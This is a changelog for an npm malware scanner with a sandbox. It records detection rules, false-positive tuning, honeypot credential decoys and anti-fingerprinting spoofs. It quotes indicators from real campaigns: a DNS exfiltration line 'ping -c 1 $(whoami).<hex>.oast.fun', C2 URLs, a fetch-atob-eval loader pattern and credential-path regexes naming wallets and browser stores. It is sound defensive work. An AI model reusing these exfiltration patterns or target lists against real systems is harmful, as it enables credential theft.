- `SENSITIVE_RE` etendu pour le catalogue 2026 : `.gcloud`, `.azure`, `.kube`,
  `.docker`, `.ethereum`, `.bitcoin`, `solana/id.json`, `Login Data`,
  `Web Data`, `cookies.sqlite`, `logins.json`, `key4.db`, MetaMask/Phantom/
  Coinbase IDs, Telegram tdata, Steam loginusers.
- Spoof additionnel : `/proc/cpuinfo` (4 cores AMD EPYC 7763, ~700 lignes
  generees), `/proc/meminfo` (8 GiB realistes), `/proc/loadavg`,
  `/sys/class/dmi/id/sys_vendor=LENOVO`, `product_name=ThinkPad X1 Carbon Gen 11`.
- `/proc/version` aligne sur `6.5.0-1015-aws` (matche le uname spoof).

**Docker hardening**

- `docker/uname-spoof.c` (~25 lignes C) : LD_PRELOAD shim qui reecrit
  `utsname.release` (`6.5.0-1015-aws`) et `utsname.version`. Cache la
  signature gVisor pour les outils natifs (uname, Python platform.uname,
  Go syscall, Rust uname, etc.).
- `docker/Dockerfile` : ajout `gcc + musl-dev`, COPY `uname-spoof.c`, RUN
  `gcc -shared -fPIC -o /opt/uname-spoof.so`, suppression du `.c` apres
  build.
- `docker/sandbox-runner.sh` :
  - Layer LD_PRELOAD : `uname-spoof.so` prepend, `libfaketime` append, save/
    restore preserve toujours autour de la mock-network (pas de regression).
  - 30 processus idle background pour `ps aux | wc -l` realiste (defeats
    process count fingerprint).
  - bash_history etendu de 9 a 50+ commandes plausibles (ssh prod, kubectl,
    aws s3, gh pr, terraform, etc.). Mirroir vers `.zsh_history`.
  - 4 projets fake : `~/projects/{my-app, api-server, dashboard, legacy-tool}`
    avec `package.json` + `README.md` + `.gitignore`.
  - `~/Documents/notes.txt`, `~/Downloads/invoice-*.pdf`, `~/Desktop/`.
  - Honey catalog 2026 elargi :
    - Cloud creds : gcloud `application_default_credentials.json`, azure
      `accessTokens.json` + `azureProfile.json`, doctl `config.yaml`, kube
      `config`, docker `config.json`
    - VCS : gh `hosts.yml`, `.git-credentials`, `.yarnrc`
    - Wallets : Solana `id.json`, Bitcoin `wallet.dat`, Ethereum
      `keystore/UTC--2026-01-01T00-00-00.000000000Z--decoy*`
    - Browser : Chrome `Login Data`/`Cookies`/`Web Data`, Firefox
      `logins.json`/`key4.db`/`cookies.sqlite`
  - 4 fichiers `*-decoy` synthetiques (zero-day catchers via
    `HONEY_DECOY_RE`) avec marker `MUADDIB-DECOY-DO-NOT-EXFIL` dans le
    contenu non-token.

**Tests**

- `tests/unit/sandbox-compound-triggers.test.js` : 13 tests (positif/negatif
  chaque compound + bornes de score + defensif sur threats invalides)
- `tests/unit/sandbox-analyzer-2026.test.js` : 14 tests (chaque nouveau
  signal + scenario combine Shai-Hulud)
- `tests/integration/sandbox-2026-pipeline.test.js` : 10 tests (network IOC
  + compound + analyzer en bout-en-bout, pas de Docker requis)
- **+37 tests verts**, aucune regression sur les suites existantes

**Hors scope assume**

- Integration BigQuery OSSF Package Analysis (consume leur feed) : ticket
  separe ; OSSF tourne deja gVisor sur tout npm/PyPI live
- libfaketime au-dela de 7 jours : couvre 95% des time bombs vues 2024-2026,
  cout ops disproportionne pour les 5% restants
- gVisor Linux uniquement : cibles Windows-specifiques (registry Run keys,
  Telegram tdata Windows path) traitees uniquement statiquement
- Mode `package surveillance` 24/7 type Socket : ticket separe

## [2.10.97] - 2026-04-19

### Context

Suite logique de v2.10.96 qui a ajoute 8 features ML contextuelles dans
`feature-extractor.js` mais sans les utiliser pour le scoring : la v2.10.96 etait
de la pure plomberie (extraire les signaux, les exporter dans les records ML).
v2.10.97 ferme la boucle en branchant 7 de ces 8 features (F8 reste desactivee,
voir v2.10.96) directement dans le scoring comme post-filtre deterministe.

L'objectif : caper le score des packages qui matchent un cluster FP a haute
precision, sans toucher au score des packages malveillants. Le post-filtre est
applique APRES `calculateRiskScore`, donc les compound boosts et les lifecycle
floors ont deja eu le dernier mot. Si plusieurs caps s'appliquent au meme
package, c'est le plus serre (la valeur la plus basse) qui gagne.

### Added — `applyContextualFPCaps()` dans `src/scoring.js`

Sept caps deterministes plumes sur les helpers de `feature-extractor.js`. Chacun
a ete valide individuellement sur le corpus humain 302 packages (198 FP + 104
malware) avec **0 malware impacte** comme critere de merge non-negociable.

| Code | Feature | Cap | Rationale |
|------|---------|-----|-----------|
| F1 | `bundle_without_install_scripts` | 30 | Bundle minifie publie sans lifecycle = bibliotheque, pas un dropper |
| F2 | `install_url_github_releases` | 35 | Installer binaire telecharge depuis GitHub Releases = pattern legitime (ex: esbuild, swc) |
| F3 | `network_destination_first_party` | 30 | Endpoint reseau = scope du package lui-meme (ex: @stripe -> api.stripe.com) |
| F4 | `git_hook_source_local` | 35 | Git hooks ecrits depuis source locale, pas downloade |
| F5 | `typosquat_scoped_package` | soustrait points typosquat | Typosquat detecte sur un nom scoped (`@scope/foo`) = false trigger Levenshtein |
| F6 | `obfuscation_without_vector` | 35 | Obfuscation commerciale (jscrambler, javascript-obfuscator) sans signaux d'attaque |
| F7 | `placeholder_anti_dep_confusion` | 20 | Package placeholder publie pour bloquer du dependency confusion |

Quand plusieurs caps s'appliquent, la logique est :
1. F5 est traite separement (il soustrait les points typosquat au score, ne cap pas).
2. Pour F1-F4, F6, F7 : on prend le `Math.min()` des caps actifs.
3. Le `riskLevel` est recalcule selon les nouveaux thresholds (CRITICAL/HIGH/MEDIUM/LOW/SAFE).

### Mesure empirique sur corpus humain (302 packages)

Validation faite sur le corpus humain-only (pas de synthetiques, pas
d'auto-labels). 198 FP humains + 104 malware humains, chacun re-scanne v2.10.96
puis v2.10.97 et compare.

| Metrique | v2.10.96 | v2.10.97 | Delta |
|----------|----------|----------|-------|
| FP cappes (sur 198) | 0 | **67** | +33.8 % |
| Malware impactes (sur 104) | 0 | **0** | 0 |
| FP CRITICAL (score >= 80) restants | 198 | 131 | -67 |
| Malware CRITICAL (score >= 80) | 104 | 104 | inchange |

La couverture de 33.8 % sur les FP est la borne inferieure : seuls les packages
matchant exactement un des 7 features sont touches. Les 131 FP CRITICAL restants
ne matchent aucun cluster connu et exigent une approche differente (probablement
de la dedup compound scoring dans `src/scoring.js`, voir roadmap v2.10.98+).

### Tests

- 3258 -> **3280** tests passes, 0 failed. Tests positifs et negatifs pour chaque
  cap : pour F1, un bundle minifie sans install scripts cap a 30, mais le meme
  bundle avec un script `postinstall` malveillant n'est PAS cap (preserve
  l'escalation). Idem pour F2-F7.
- Test de composition : un package qui matche F1 et F3 simultanement est cap au
  min des deux (30, pas 35).
- Test de regression : sur 67 packages adversariaux (datasets/adversarial/), zero
  cap applique.

### Notes operationnelles

- Le post-filtre tourne sur le scanner complet ET dans le monitor. Le monitor
  emet maintenant un champ `summary.contextualCaps[]` quand un ou plusieurs caps
  s'appliquent, format `[{ feature: 'bundle_without_install_scripts', cap: 30 }]`.
- Le ML retrain (cible v2.11) utilisera les memes 7 features comme entrees, plus
  les autres features ML existantes. Le post-filtre v2.10.97 est volontairement
  deterministe (pas de threshold ML) pour decoupler la stabilisation FPR de la
  prochaine iteration ML.

## [2.10.96] - 2026-04-18

### Context

Apres la v2.10.95 ou le diagnostic empirique a montre qu'aucun ajustement de
heuristique ne reduisait significativement le FPR sur les 545 packages benign
curated, il fallait changer d'approche. Plutot que d'ajouter encore des regles
de FP reduction au scanner, on commence a construire les **features
contextuelles** dont le ML aura besoin pour discriminer les clusters FP des
vrais malwares.

Cette release est de la pure plomberie : 8 features extraites par scan + les
signaux d'environnement (homepage, fileSizes, threat.urls) propages jusqu'aux
records ML. Les features sont stockees dans `ml-training*.jsonl` mais ne
modifient PAS encore le scoring. Le branchement scoring vient en v2.10.97.

### Added — 8 features contextuelles dans `src/ml/feature-extractor.js`

Chaque feature retourne un boolean (cast en 0/1) calculable depuis le scan
result + les metadonnees du package (npm registry meta, file sizes, scripts).

| ID | Feature key | Cible cluster FP |
|----|-------------|------------------|
| F1 | `bundle_without_install_scripts` | Bundles minifies publies sans lifecycle scripts |
| F2 | `install_url_github_releases` | Installers binaires depuis GitHub Releases (esbuild, swc, sharp) |
| F3 | `network_destination_first_party` | Endpoint reseau dans le scope du package (api.stripe.com pour @stripe) |
| F4 | `git_hook_source_local` | Git hooks ecrits depuis source locale (husky, simple-git-hooks) |
| F5 | `typosquat_scoped_package` | Typosquat sur nom scoped `@scope/foo` (false trigger Levenshtein) |
| F6 | `obfuscation_without_vector` | Obfuscation commerciale sans signaux d'attaque |
| F7 | `placeholder_anti_dep_confusion` | Placeholder publie pour bloquer dependency confusion |
| F8 | `install_script_no_network_egress` | **DESACTIVEE** : EGRESS_TYPES incomplet (manque `dangerous_exec`, `lifecycle_dangerous_exec`, `node_inline_exec`) -> fire sur malwares confirmes |

F8 est volontairement laissee inerte (`features.install_script_no_network_egress = 0`)
en attente d'un fix de `EGRESS_TYPES` dans une release ulterieure. La validation
empirique a montre qu'elle classifie comme "install script sans egress reseau"
des malwares qui exfiltrent via `dangerous_exec` (curl/wget directs), faussant
le ML retrain. Mieux vaut une feature inactive qu'une feature qui pollue.

### Plomberie

- `src/scanner/npm-registry.js` : extraction de `homepage` depuis le manifest
  npm pour detection F3 (matching domain vs scope).
- `src/scanner/ast-detectors/handle-post-walk.js` : ajout de `threat.urls[]`
  (host extrait de chaque URL detectee) pour cross-ref avec homepage.
- `src/scanner/ast.js` : passage du contexte au post-walk handler pour acces
  aux URLs.
- `src/pipeline/processor.js` : propagation `fileSizes`, `homepage` et
  `threat.urls` jusqu'au build du record ML.
- `src/monitor/ingestion.js` : passage des memes signaux au monitor pour
  ecriture dans `ml-training-monitor.jsonl`.

### Tests

- 3236 -> **3258** tests passes, 0 failed. 22 nouveaux tests dans
  `tests/unit/ml-feature-extractor.test.js` couvrant les 7 features actives :
  positif (le cluster FP attendu fire), negatif (un malware ne fire pas),
  edge cases (URLs malformees, scope vide, fichier de taille zero).

### Notes operationnelles

- Aucun changement de scoring, aucun changement de detection. Les scans v2.10.96
  produisent les memes scores que v2.10.95 sur tous les packages.
- Les records ML emis par le monitor incluent maintenant 8 nouvelles colonnes
  features. Le retrain qui suivra (cible v2.11) consommera ces colonnes.
- Datasets ML training pre-v2.10.96 n'ont PAS ces features. Le retrain ne pourra
  donc s'appuyer que sur les scans post-deploy (a partir du 2026-04-18).

## [2.10.95] - 2026-04-18

### Context

Release honnete suite a un cycle de review FP qui a identifie 8 clusters de FP dans
le rapport `data/fp-analysis-week-2026-04-10-17.md`. Un premier plan d'ajustements
avait ete conçu mais le diagnostic empirique (mesure FPR avant/apres sur les 545
packages benign curated) a montre qu'aucun ajustement ne delivrait le critere de
merge du plan (`delta_curated_pp <= -1.0`). Cette release conserve uniquement les
elements orthogonaux qui ne dependent pas de l'ajustement FP original, et documente
honnetement l'absence de gain mesure.

### Fixed — Windows EPERM crash during `muaddib evaluate`

Le workflow `node bin/muaddib.js evaluate` sur Windows crashait au premier package
qui declenchait EPERM (locked file, long path, antivirus). Exemple observe sur `ejs`
au package 369/548 : le `fs.rmSync(pkgCacheDir, { recursive: true, force: true })`
de cleanup apres une erreur d'extraction remontait l'exception non-catchee jusqu'au
top-level catch de `bin/muaddib.js:608`, tuant l'evaluation entiere.

- `src/commands/evaluate.js` — 8 occurrences de `fs.rmSync(pkgCacheDir, ...)` dans
  `downloadAndExtract` et `downloadAndExtractPyPI` enveloppees dans try/catch
  silencieux. Un cleanup qui rate sur Windows ne doit pas tuer une run de 545
  packages.
- `src/commands/evaluate.js` — les trois boucles d'evaluation benign (`evaluateBenign`,
  `evaluateBenignPyPI`, `evaluateBenignRandom`) wrappent maintenant `downloadAndExtract`
  et `silentScan` en try/catch. Un package qui plante (EPERM, long path, file lock) est
  marque `skipped++` avec l'erreur dans `details[].error` et l'eval continue. Les FPR
  restent calculees sur `scanned = total - skipped` donc la mesure reste honnete.

### Changed — `hasHashVerification` heuristique durcie (pas d'impact FPR mesure)

`ctx.hasHashVerification` dans `src/scanner/ast.js:211` etait une regex simple
`createHash + digest`. Un attaquant pouvait declencher le downgrade CRITICAL → HIGH
de `download_exec_binary` avec juste `crypto.createHash('sha256').update(buf).digest('hex')`
sans jamais comparer le resultat. Bypass a 3 lignes.

- `src/scanner/ast.js:211` — la regex exige maintenant aussi la presence d'un
  operateur de comparaison dans le meme fichier (`===`, `!==`, `.equals(`,
  `assert.strictEqual/equal/deepEqual/deepStrictEqual`, `throw`). Commentaire
  explicite au-dessus du check documente que c'est une heuristique best-effort
  niveau fichier, pas une preuve que le hash est reellement consomme. Un fix proper
  (taint-tracking function-scope) est differe a un PR dedie.

Impact mesure sur le corpus benign 545 packages : **0 FPR delta**. Le durcissement ne
reclassifie personne (tous les packages avec `createHash + digest` avaient aussi une
comparaison visible quelque part). Le gain est defensif : une exploitation future ne
peut plus simplement fake `createHash(...).digest(...)` sans commitment.

### Abandoned — triple-gate downgrade CRITICAL→MEDIUM

Un plan initial proposait un downgrade MEDIUM quand `download_exec_binary` co-occurre
avec `hasHashVerification=true` ET `fetchOnlySafeDomains=true` (all URLs on
github/npm/nodejs/pypi). Hypothese : ~180 packages Cluster A legitimes (electron,
sharp, @spencer-kit/aor, etc.) beneficieraient du downgrade.

**Diagnostic empirique** (v2.10.94 vs triple-gate applique, meme machine, meme corpus) :

- FPR curated : 15.60% → 15.60% (0.00 pp)
- FPR random : 7.00% → 7.00% (0.00 pp)
- FPR after ML : 10.28% → 10.28% (0.00 pp)
- TPR@3 : 93.85% → 93.85% (0.00 pp)
- ADR : 96.26% → 96.26% (0.00 pp)

Cause racine (analyse sur 85 benign packages flagges) : `download_exec_binary` fire
sur **3 packages** seulement (esbuild, yarn, @backstage/create-app). Les deux derniers
etaient deja LOW. esbuild score 100 mais son score est domine par d'autres rules
CRITICAL (`lifecycle_file_exec`, `lifecycle_dataflow`, etc.), pas par
`download_exec_binary`. Le downgrade de cette rule a donc 0 impact.

Les vrais drivers FP sur les 85 flagged sont le cumul de `high_entropy_string` (153),
`prototype_hook` (146), `string_mutation_obfuscation` (131), `prototype_pollution`
(118), `credential_regex_harvest` (115), `dynamic_require:HIGH` (81). Ce bruit exige
un redesign plus fondamental (probablement niveau scoring des combinaisons LOW, ou
whitelist framework) qui sortira d'un v2.10.96 dedie. Full diagnostic dans
`data/fp-v2.10.95-validation.md` (prive, gitignored).

### Tests

- 3 232 → **3 236** tests passes, 0 failed. 4 nouveaux tests pour `download_exec_binary` :
  (1) sans hash → CRITICAL regression, (2) hash sans comparaison → CRITICAL (nouveau
  gate), (3) hash avec comparaison → HIGH (comportement preserve), (4) hash avec
  comparaison + URL non-allowliste → HIGH (regression).

## [2.10.94] - 2026-04-17

### Added — Validation empirique des malwares sous-threshold (rescan VPS)

Apres la v2.10.93 qui ajoutait les regles ltidi/csec/OAST/self_destruct_eval, un
rescan empirique sur les tarballs reels de la semaine 2026-04-10→17 a mesure les
scores effectifs et identifie 4 gaps restants :

| Malware | v2.10.93 score | Cause du gap |
|---------|----------------|--------------|
| ltidi cmp-api-stub | 35 (cap MT-1) | `dependency_url_suspicious` n'est pas dans HC_TYPES, MT-1 ceiling cappe a 35 |
| csec-crypto-toolkit | 19 | `self_destruct_eval` ne matche pas car `unlinkSync(__filename)` est dans le string XOR, pas dans le source |
| apache-arrow-14 | 50 | Floor CRITICAL a 50 mais pas de mecanisme pour pousser au-dessus |
| koa-v3 | 9 | `curl_env_exfil` ne couvre que curl/wget, pas ping/nslookup/dig |

### Four scoped fixes

- `src/scanner/package.js` — nouveau threat type `external_tarball_dep` (CRITICAL)
  emit a la place de `dependency_url_suspicious` quand l'URL pointe vers une tarball
  (.tgz/.tar.gz/.tar.bz2/.zip) sur un host non-allowlist (cloud storage, CDN random).
  Ajoute a `HIGH_CONFIDENCE_MALICE_TYPES` pour bypass le MT-1 score ceiling.
- `src/scanner/ast-detectors/handle-new-expression.js` — nouveau threat type
  `function_runtime_args` (CRITICAL, AST-090) emit quand `new Function()` recoit >= 2
  literal args runtime (`require`, `__dirname`, `__filename`, `module`, `exports`,
  `process`) + body dynamique + presence d'obfuscation dans le meme fichier
  (`hasFromCharCode || hasBase64Decode || hasZlibInflate`). Le gating obfuscation
  evite les FP sur les wrappers CommonJS legitimes (babel-register, ts-node, pirates,
  jest, nyc, vitest). Ajoute a HC_TYPES.
- `src/scanner/package.js` — `curl_env_exfil` etend son regex pour inclure
  `ping|nslookup|dig|host|getent`, catchant koa-v3 qui utilise `ping -c 1 $(whoami).<hex>.oast.fun`.
- `src/scoring.js` — nouveau floor a 75 quand 2+ threat types DISTINCTS sont CRITICAL
  package-level (ex : `curl_env_exfil` + `lifecycle_env_exfil` compound). Co-occurrence
  2 CRITICAL package-level = signature quasi-certaine de malware.

### Rule IDs added

- `MUADDIB-AST-090` : `function_runtime_args` — new Function() avec runtime args +
  obfuscation (csec pattern)
- `MUADDIB-PKG-020` : `external_tarball_dep` — dep URL tarball sur host third-party
  (ltidi chain)

### Rescan empirique v2.10.93 → v2.10.94 (mesure sur tarballs reels VPS)

| Malware | v2.10.93 | v2.10.94 | ≥75 CRITICAL? |
|---------|----------|----------|---------------|
| ltidi cmp-api-stub | 35 | 50 | Non, mais au-dessus ADR 20 |
| csec-crypto-toolkit@4.2.4 | 19 | **88** | Oui |
| apache-arrow-14 | 50 | 75 | Oui |
| koa-v3 | 9 | 75 | Oui |
| ourin-baileys (hors scope) | 41 | 46 | Non, reste a design |

### Tests

- 3 230 → **3 232** tests passes, 0 failed. 2 nouveaux tests `function_runtime_args` :
  positif csec-style (XOR+charcode+runtime args → CRITICAL), negatif module wrapper
  legit (ts-node-style sans obfuscation → pas d'emission).

## [2.10.93] - 2026-04-17

### Added — Security review 2026-04-10→17 remediation

Manual security review of 22 858 tarballs across 8 days surfaced 37 confirmed
malware packages (up from 31 in the initial pass), including two campaigns that
completely bypassed the triage threshold (ADR_THRESHOLD=20):

- **ltidi chain attack** (9 packages, score 10) — stub packages with no install
  hooks, payload hosted on `ltidi.storage.googleapis.com` as tarball dependency.
  Payload analysis confirmed DNS exfil of hostname/homedir/username via
  `*.oastify.com` hex-encoded subdomains.
- **csec credential stealer** (3 packages, score 19) — XOR (key `OrDeR_7077`) +
  `new Function()` + `unlinkSync(__filename)` anti-forensics, exfiltrates
  `.env` / `.ssh` / `.npmrc` / `.aws/credentials` to
  `csec-supply-chain-attack.vercel.app`.

Three code changes address the bypass:

- **Package scanner — external tarball URL escalation** (`src/scanner/package.js`):
  `dependency_url_suspicious` now escalates to **CRITICAL** when the URL ends in
  `.tgz` / `.tar.gz` / `.tar.bz2` / `.zip` AND the host is NOT on an allowlist
  of legitimate tarball sources (`github.com`, `codeload.github.com`,
  `objects.githubusercontent.com`, `gitlab.com`, `bitbucket.org`,
  `registry.npmjs.org`, `registry.yarnpkg.com`). Raw tarball URLs on cloud
  storage (GCS, S3, Azure blob, CDN hosts) bypass npm registry audit entirely
  — always the ltidi pattern. Non-tarball URLs stay HIGH. Github release
  tarballs stay HIGH.
- **AST compound — self-destruct eval** (`src/scanner/ast.js`,
  `src/scanner/ast-detectors/handle-post-walk.js`,
  `src/rules/index.js` AST-089, `src/response/playbooks.js`,
  `src/scoring.js` DIST_EXEMPT + `src/monitor/classify.js` HC_TYPES):
  new `self_destruct_eval` detection fires **CRITICAL** when a file contains
  both (a) dynamic code execution (`eval`/`new Function`/`Module._compile` with
  non-literal args) and (b) self-deletion of the executing file via
  `unlinkSync`/`rmSync`/`renameSync` targeting `__filename`,
  `module.filename`, or `require.main.filename`. Zero legitimate use case —
  legitimate packages do not destroy their own source after running obfuscated
  code. Exempt from dist-file downgrade (HIGH minimum in bundles). Added to
  `HIGH_CONFIDENCE_MALICE_TYPES` (reputation attenuation bypass).
- **IOC enrichment** (`iocs/builtin.yaml`,
  `src/scanner/ast-detectors/constants.js`):
  - Added `oast.online`, `oast.pro`, `interact.sh`, `projectdiscovery.io` to
    `SUSPICIOUS_DOMAINS_HIGH` (OAST callback domains — always malicious in
    published npm packages).
  - Added `csec-supply-chain-attack.vercel.app`, `files.giftedtech.co.ke`
    (Baileys V3 C2), `phish.sh` (JET/SkipTheDishes depconf webhook) to
    `SUSPICIOUS_DOMAINS_HIGH`.
  - Added 9 ltidi stub packages + `ltidisafe` (wildcard, all versions) to
    `compromised_packages` under `review-apr-2026-ltidi`.
  - Added 3 csec variants (`csec-crypto-toolkit@4.2.2`, `@4.2.4`,
    `ccsseecc-crypto-toolkit@4.5.1`) under `review-apr-2026-csec`.
  - Added `koa-v3@9.4.0` (typosquat with ping DNS exfil to `.oast.fun`) under
    `review-apr-2026-ping-dns-exfil`.
  - Added `cmp-api-stub@99.9.1` to the ltidi bucket (found session 2).

### Impact on detection

- **ltidi campaign (9 packages)**: score 10 → 50+ (dep URL CRITICAL 25 pts +
  dependency_ioc_match HIGH 10 pts + package-level CRITICAL floor 50). Crosses
  ADR_THRESHOLD=20.
- **csec campaign (3 packages)**: score 19 → 90+ (self_destruct_eval CRITICAL
  25 pts file-level + existing signals, bypasses reputation attenuation via
  HC_TYPES). Crosses ADR_THRESHOLD=20.
- **OAST domains**: packages using `.oast.online` or `.oast.pro` now fire
  `suspicious_domain` HIGH at the AST string literal level.

### Tests

- 3222 → **3228 passed**, 0 failed (added 5 self_destruct_eval tests + 3 new
  dep URL escalation tests; updated 2 existing dep URL tests from HIGH → CRITICAL
  expectation; updated 2 rule count tests 201 → 202; updated HC_TYPES count 22
  → 23).

## [2.10.74] - 2026-04-11

### Fixed — FP cluster reduction (audit forensique v2.10.72)

Forensic audit of 53,953 production alerts across 8,396 high-score packages revealed
that ~71-79% of high-score alerts came from structural false positives concentrated
in 4 clusters. Full methodology documented in `.claude/plans/recursive-splashing-seal.md`.

- **P1** Bundle FP downgrade: extended `DIST_FILE_RE` via new `src/shared/bundle-detect.js`
  (`BUNDLE_PATH_RE`) to cover bundle patterns the narrow legacy regex was missing:
  `.umd.js`, `.esm.js`, `.es.js`, `.common.js`, `.max.js`, `.prod.js`, `.production.js`,
  hash-suffixed chunks (`assets/index-a1b2c3d4.js` vite/esbuild/rollup convention),
  `fesm*/`, `browser/`, `assets/`, `chunks/`, `_app/`, `lib/bundled/`. The
  `applyFPReductions` dist-file gate now matches both the narrow legacy regex and the
  extended `BUNDLE_PATH_RE`, then consults `hasBundleVetoSignal()` to block the
  downgrade when a veto signal is present on the same file (reverse_shell,
  node_modules_write, npm_publish_worm, npm_token_steal, systemd_persistence,
  unicode_invisible_injection, IOC hits). Types with existing compound recovery
  (staged_binary_payload, crypto_decipher, fetch_decrypt_exec, etc.) are intentionally
  NOT in VETO_TYPES — they still get downgraded but compound rules still fire via
  the existing v2.9.6 `originalSeverity` gate, preserving event-stream-style detection.
  Packages impacted by extended regex: babylonjs, electron, @kitware/vtk.js, dprint,
  @jetbrains/junie, @zuplo/core, @stencil/core, playwright, @equinor/echo-*,
  @alipay/ams-checkout, @testim/testim-cli, @vanwei-wcs/video-player-v2,
  @bookolosystem/engine, @epie/bi-crud.
- **P2** AST-006 `dynamic_require` source qualification: new `ctx.varSource` Map in
  AST scanner context tracks where a variable's value originated — `string_literal`,
  `array_literal`, `object_literal`, `fs_readdir`, `require_json`, `function_call`,
  `computed_expression`, or `env_var`. `handleCallExpression` now selects severity
  based on source: `string_literal`/`array_literal`/`object_literal`/`fs_readdir`/
  `require_json` → **LOW** (legit plugin loader), `env_var` → **CRITICAL**
  (credential/path exfil vector — `require(process.env.MODULE_NAME)`),
  `function_call`/`computed_expression` → **HIGH** (real obfuscation). Fixes 53 FP
  fires on legitimate plugin loaders from the audit (@itentialopensource/adapter-*,
  masterrecord, testim, apminsight, @teamfabric/xpm, @forklaunch/express).
- **P3** AST-007 quick-scan downgrade: `src/pipeline/executor.js` quick-scan
  now emits threats as MEDIUM (was HIGH) with new `degraded: true, quickScan: true`
  flags. Rationale: regex-only mode with no scope tracking cannot distinguish
  `exec()` at module top-level from `exec()` in an exported route handler.
  `Module._load` pattern stays CRITICAL (never legit). `scoring.js` now excludes
  `degraded: true` non-CRITICAL threats from `max_file_score` and places them in
  a separate `degradedScore` bucket capped at 15 that contributes to package score.
  Fixes 18+ FP fires on rsshub/dist-lib/*.mjs route handlers.
- **P4** WASM/Emscripten artifact skip in `src/scanner/obfuscation.js`: files
  matching `/wasm|emscripten|dcmtk|ffmpeg-wasm|opus-decoder|mpg123-decoder|wasm-audio-decoders/`
  basename OR containing Emscripten content markers (`Module["asm"]`, `HEAPU8`,
  `WebAssembly.instantiate`, `_emscripten_`, `asmLibraryArg`, `wasmMemory`, etc.)
  OR the base64 WASM magic bytes (`AGFzbQ`) are skipped from obfuscation detection.
  Other scanners (AST, dataflow, hash, IOC) continue to analyze them — only the
  obfuscation scanner's heuristics are disabled since they produce FP on compiled
  WASM by construction. Fixes 52 ENTROPY-001 FP fires on `@leoqlin/openclaw-qqbot`'s
  bundled `mpg123-decoder/src/EmscriptenWasm.js`.

### Added

- Ground-truth fixture `tests/ground-truth/samples/react-emits/` (GT-067) —
  forensic reproduction of the live-detected malware documented in
  `docs/blog/react-emits-malware.html`. Fake Node.js `path` module port whose
  `main: "./path.js"` triggers two top-level IIFEs doing
  `fetch(atob(URL)).then(.json()).then(eval(data.content))` on every `require()`.
  Base64-encoded C2 URLs (`http://173.211.46.220/lverla.js` and
  `http://173.211.46.220/lverl`) hardcoded as `randomStringRe` and `tokenStringRe`.
  VPS audit confirmed the attacker evolved across 4 versions in 4 hours: v1.0.0
  used split payload/trigger via 5 malicious deps (sandbox-clean), v1.0.2 hardcoded
  URLs directly in path.js (this fixture), v1.0.3 half-retract broke the package.
- 5 entries added/mutated in `data/auto-labels.json`:
  - `react-emits@1.0.0`, `@1.0.1`, `@1.0.2`, `@1.0.3` — new entries as
    `confirmed_malicious` with signals `["manual-review-2026-04-11",
    "blog-published", "npm-removed"]`.
  - `@lystech/core@3.0.42` — mutated from `pending` to `confirmed_malicious`.
    Reason: aggressive commercial telemetry pattern that silently deploys a
    GitHub Actions workflow into consumer repos during postinstall, beaconing
    repo identity to a third-party backend. Detection (AST-015 + COMPOUND-007)
    is correct — structurally indistinguishable from a supply-chain worm.
- 2 IOC markers added to `iocs/builtin.yaml`:
  - `"173.211.46.220"` (plain IP form)
  - `"aHR0cDovLzE3My4yMTEuNDYuMjIw"` (base64 prefix of `http://173.211.46.220`)
- New helper module `src/shared/bundle-detect.js` exports `BUNDLE_PATH_RE`,
  `VETO_TYPES`, `SENSITIVE_ENV_RE`, `isBundlePath()`, `hasBundleVetoSignal()`.
- 12 new tests across 2 files:
  - `tests/scanner/obfuscation.test.js` — 3 P4 tests (WASM basename skip,
    WASM content-marker skip, non-WASM obfuscation regression).
  - `tests/scanner/ast.test.js` — 3 DREQ-QUAL P2 tests (env_var→CRITICAL,
    fs_readdir→LOW, require_json→LOW) + 3 AST P3 tests (quick-scan MEDIUM
    downgrade + degraded flag, Module._load CRITICAL exception, degraded
    threats capped at 15 in package score).

### Notes

- FPR estimated improvement: 14% → 6-9% (-5 to -8 points) based on audit of
  78 high-score samples. Actual measurement deferred to post-release FPR sweep.
- TPR maintained at 93.75% (60/64 ground truth) — no regression introduced
  by P1-P4 in the ground-truth validation (9 pre-existing GT failures on
  master are unchanged by this release).
- Rules count unchanged: **200** (195 RULES + 5 PARANOID). P2 extends AST-006
  without splitting it into two rule IDs.
- New ground-truth fixture react-emits brings total GT count to **67 samples**.
- Carry-over backlog for v2.10.75:
  - **P5** Refine `PKG-014` git-URL deps owner mismatch FP — confirmed FP
    on `baron-baileys-v2@1.4.3` (legit German hobby dev with separate GitHub
    org). Downgrade to MEDIUM unless combined with compound risk signals.
  - Add proper `ips:` section to `iocs/builtin.yaml` with loader extension
    in `src/ioc/yaml-loader.js` (replaces the marker string format).
  - `product_specific_vendor_telemetry` MEDIUM tier for central-icons /
    @alertlogic / @vera-ai / forklaunch cluster.
  - Optional P1 size/content check for bundles at package root (e.g.
    `babylonjs/babylon.js`) that don't match `BUNDLE_PATH_RE`.
- ML retrain deferred until post-release FPR measurement confirms the gain.

## [Unreleased]

### Fixed
- **ANSSI audit remediation (v3)**: 10 findings addressed (3 CRITICAL, 7 MAJOR, 10 MINOR)
  - C1: Resolved merge conflict in package.json (v2.10.60)
  - C2: Added `clearASTCache()` to `resetAll()` in scan-context.js (cross-scan state leak)
  - C3: Added `dependency_ioc_match` to `IOC_TYPES` in evaluate.js (iocBased classification bug)
  - M1/M2: Updated CLAUDE.md and README.md with v2.10.57 metrics (dual TPR@3/TPR@20)
  - M3: Extended evaluate cache fingerprint to include IOC/GT/benign data files
  - M4: Set `has_ioc_match=0` in ML feature extractor (circular IOC leakage prevention)
  - M5: Added temporal guard (30-day max age) to auto-labeler npm takedown confirmation
  - M6: Documented bundler model threshold=0.1 as intentionally conservative
  - M7: Added holdout sealing procedure to EVALUATION_METHODOLOGY.md
  - m1: Annotated catch blocks in llm-detective.js
  - m2: Added per-scanner timeout (45s) for AST, dataflow, entropy in executor.js
  - m3: Added architecture comment to handle-call-expression.js (95 patterns, 7 categories)
  - m4: Replaced AWS doc example canary tokens with project-specific values
  - m5: Lowered sandbox timer detection threshold from 1h to 15min
  - m6: Added gVisor kernel version spoofing in preload.js (os.release + /proc/sys/kernel/osrelease)
  - m7: Added WebAssembly.compile/instantiate logging in sandbox preload.js
  - m8: Documented rule ID gaps (see below)

### Notes
- **Rule ID gaps** (ANSSI audit m8): MUADDIB-SHELL-022 and MUADDIB-COMPOUND-003 are
  unassigned IDs (reserved but never used), not deleted rules. MUADDIB-ENTROPY-002
  was removed in v2.5.14 (file-level entropy scan, documented in that version's changelog).
  These gaps are intentional — rule IDs are stable identifiers and are never reassigned.

## [2.10.43] - 2026-03-31

### Added
- **Trusted dep-diff detection**: New dependency analysis for TRUSTED (popular) packages
